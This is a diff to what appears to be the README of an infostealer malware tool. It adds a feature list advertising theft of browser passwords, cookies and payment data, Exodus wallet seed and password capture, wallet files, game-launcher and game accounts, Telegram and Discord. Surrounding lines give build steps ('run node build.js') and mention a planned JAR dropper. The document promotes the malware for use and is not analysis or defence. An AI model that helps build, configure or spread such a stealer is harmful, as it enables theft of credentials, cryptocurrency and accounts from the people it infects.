@@ -10,7 +10,7 @@
 - To be added
 - Opera n Opera GX support
 - JAR and Chattriggers dropper.
-- 
+  
 
 - How to use
 - Download the bot folder
@@ -21,3 +21,15 @@
 - when done run node build.js
 - put in ur stuff
 - done
+
+- It steals anything you can really think of except some browsers it steals, chrome, brave, edge, firefox browsers.
+- Browser passwords
+- Browser cookies
+- Browser payments
+- Exodus injection (Seed and password yes it gives u the files)
+- Wallet stealer (steals wallet files)
+- Game launcher stealer (Rockstar, Epic, steam)
+- Game stealing (minecraft including most launchers, roblox, valorant)
+- Telegram
+- Discord
+- Add a extra line to make it look better
